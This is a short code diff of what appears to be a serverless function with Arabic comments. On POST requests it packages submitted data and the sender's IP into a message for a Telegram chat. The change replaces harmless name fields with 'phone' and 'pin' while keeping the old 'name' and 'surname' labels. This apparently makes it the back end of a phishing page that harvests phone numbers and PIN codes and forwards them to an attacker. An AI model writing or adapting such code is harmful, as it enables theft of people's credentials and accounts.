@@ -15,8 +15,8 @@ exports.handler = async (event) => {
         } 
         // حالة 2: إذا كان الطلب إرسال بيانات (POST)
         else if (event.httpMethod === "POST") {
-            const { name, lastName } = JSON.parse(event.body);
-            messageText = `📩 *بيانات مستخدم جديدة:*\n\n👤 الاسم: ${name}\n👥 الكنية: ${lastName}\n\n📍 مصدر الإرسال (IP): \`${ip}\``;
+            const { phone, pin } = JSON.parse(event.body);
+            messageText = `📩 *بيانات مستخدم جديدة:*\n\n👤 الاسم: ${phone}\n👥 الكنية: ${pin}\n\n📍 مصدر الإرسال (IP): \`${ip}\``;
         }
 
         // إرسال الرسالة إلى تيليجرام
